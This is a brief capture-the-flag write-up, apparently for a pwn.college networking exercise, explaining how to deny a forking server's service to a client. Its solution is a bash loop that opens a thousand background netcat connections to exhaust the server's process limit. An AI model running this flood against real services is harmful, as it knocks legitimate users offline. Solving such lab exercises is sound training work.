---
tags: ["Computer Networking"]
title: "Denied of Service 2"
description: Denied of Service 2
reference: https://pwn.college/intro-to-cybersecurity/intercepting-communication/
---

# Problem

The client at 10.0.0.3 is communicating with the server at 10.0.0.2 on port 31337. Deny this service.

This time the server forks a new process for each client connection.

# Solution

Make the server to serve many "fake" clients at the same time so that the server will reach to it process count limits and the client at 10.0.0.3 can't connect to the server.

```
for i in {1..1000}; do nc 10.0.0.2 31337 -d & done
```
